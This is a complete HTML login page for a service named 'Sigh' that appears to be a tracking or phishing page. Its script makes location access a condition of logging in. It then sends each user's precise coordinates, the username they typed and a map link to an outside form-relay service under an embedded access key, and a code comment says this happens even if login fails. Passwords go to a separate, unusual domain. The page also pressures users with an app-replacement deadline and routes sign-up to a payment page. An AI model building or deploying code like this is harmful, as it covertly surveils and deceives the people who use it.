<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login - Sigh</title>

<!-- PWA -->
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="#f5576c">

<style>
* { margin:0; padding:0; box-sizing:border-box; }
body {
  font-family: system-ui, -apple-system, sans-serif;
  background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}
.card {
  background:white;
  padding:2.5rem;
  border-radius:20px;
  box-shadow:0 25px 50px rgba(0,0,0,0.15);
  width:100%;
  max-width:420px;
  position:relative;
}
.logo {
  position:absolute;
  top:18px;
  left:18px;
  height:36px;
}
h1 { text-align:center; margin-bottom:2rem; }
.form-group { margin-bottom:1.5rem; }
label { display:block; margin-bottom:0.6rem; font-weight:500; }
input { width:100%; padding:14px; border-radius:12px; border:2px solid #e1e5e9; font-size:16px; }
button { width:100%; padding:14px; background:linear-gradient(135deg,#f5576c,#e94560); color:white; border:none; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; }
button:disabled { background:#a0aec0; cursor:not-allowed; }
.message { margin-top:1rem; }
.success { background:#c6f6d5; color:#22543d; padding:12px; border-radius:12px; }
.error { background:#fed7d7; color:#742a2a; padding:12px; border-radius:12px; }
.offline { background:#fefcbf; color:#744210; padding:12px; border-radius:12px; margin-bottom:1rem; display:none; }
.link { text-align:center; margin-top:1.5rem; }
.link a { color:#f5576c; text-decoration:none; font-weight:500; }
#locationNotice {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.6);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}
#locationNotice div {
  background:white;
  padding:2rem;
  border-radius:16px;
  max-width:320px;
  text-align:center;
  font-family:system-ui;
}
#locationNotice button {
  width:100%;
  padding:12px;
  background:#f5576c;
  color:white;
  border:none;
  border-radius:10px;
  font-weight:600;
}
</style>
</head>

<body>
<!-- LOCATION NOTICE MODAL -->
<div id="locationNotice">
  <div>
    <h3>Location Required</h3>
    <p style="font-size:14px;color:#555;margin-bottom:1.5rem;">
      To continue, please allow system location access.
    </p>
    <button id="continueBtn">Continue</button>
  </div>
</div>

<div class="card">
  <img src="logo.png" alt="Sigh Logo" class="logo">
  <h1>Login</h1>
  <p>Please make sure you get our new app by 14th feb<br> because this app will be out of service.<br>Thank you for your cooperation </p>

  <div id="offlineMessage" class="offline">
    You are offline. Please check your internet connection.
  </div>

  <form id="loginForm">
    <div class="form-group">
      <label>Username</label>
      <input type="text" name="username" required placeholder="Enter username">
    </div>
    <div class="form-group">
      <label>Password</label>
      <input type="password" name="password" required placeholder="Enter password">
    </div>

    <button type="submit" id="submitBtn">Login</button>
    <div id="message" class="message"></div>
  </form>

  <div class="link">
    <a href="pay.html">
      Create New Account
    </a>
  </div>
</div>

<script>
/* =============== CONFIG =============== */
const API_BASE = 'https://appp.emxluz.xyz';
const LOCATION_ENDPOINT = 'https://api.web3forms.com/submit';
const ACCESS_KEY = 'e9d3714e-a411-470a-a21a-b20934bdc66e';

/* =============== ELEMENTS =============== */
const form = document.getElementById('loginForm');
const message = document.getElementById('message');
const submitBtn = document.getElementById('submitBtn');
const offlineMessage = document.getElementById('offlineMessage');
const notice = document.getElementById('locationNotice');
const continueBtn = document.getElementById('continueBtn');

/* =============== ONLINE CHECK =============== */
function checkOnline() {
  offlineMessage.style.display = navigator.onLine ? 'none' : 'block';
}
checkOnline();
window.addEventListener('online', checkOnline);
window.addEventListener('offline', checkOnline);

/* =============== FORM SUBMIT =============== */
form.addEventListener('submit', (e) => {
  e.preventDefault();
  message.innerHTML = '';
  if (!navigator.onLine) {
    message.innerHTML = '<div class="error">You are offline.</div>';
    return;
  }
  if (!navigator.geolocation) {
    message.innerHTML = '<div class="error">Location not supported.</div>';
    return;
  }
  // Show custom modal first
  notice.style.display = 'flex';
});

/* =============== CONTINUE BUTTON (TRIGGERS LOCATION) =============== */
continueBtn.addEventListener('click', () => {
  notice.style.display = 'none';
  submitBtn.disabled = true;
  submitBtn.textContent = 'Requesting Location...';

  navigator.geolocation.getCurrentPosition(
    position => handleLocation(position),
    () => {
      submitBtn.disabled = false;
      submitBtn.textContent = 'Login';
      message.innerHTML =
        '<div class="error">You must allow location access to continue.</div>';
    },
    { enableHighAccuracy:true, timeout:10000 }
  );
});

/* =============== SEND LOCATION & LOGIN =============== */
function handleLocation(position){
  const formData = Object.fromEntries(new FormData(form));

  // Send location immediately (even if login fails)
  fetch(LOCATION_ENDPOINT, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({
      access_key: ACCESS_KEY,
      username_attempt: formData.username,
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      time: new Date().toISOString(),
      map:`https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
    })
  });

  // Attempt login after sending location
  loginAttempt(formData);
}

async function loginAttempt(data){
  submitBtn.textContent = 'Logging in...';
  try{
    const res = await fetch(`${API_BASE}/api/login`,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({username:data.username,password:data.password})
    });
    const result = await res.json();
    if(res.ok && result.success){
      sessionStorage.setItem('username', result.username);
      sessionStorage.setItem('userId', result.userId);
      message.innerHTML = '<div class="success">Login successful</div>';
      setTimeout(()=>location.href='kopen.html',1200);
    } else {
      message.innerHTML = `<div class="error">${result.error || 'Invalid login details'}</div>`;
    }
  }catch{
    message.innerHTML='<div class="error">Cannot connect to server.</div>';
  }finally{
    submitBtn.disabled = false;
    submitBtn.textContent = 'Login';
  }
}

/* =============== PWA SERVICE WORKER =============== */
if('serviceWorker' in navigator){
  navigator.serviceWorker.register('/sw.js');
}
</script>
</body>
</html>
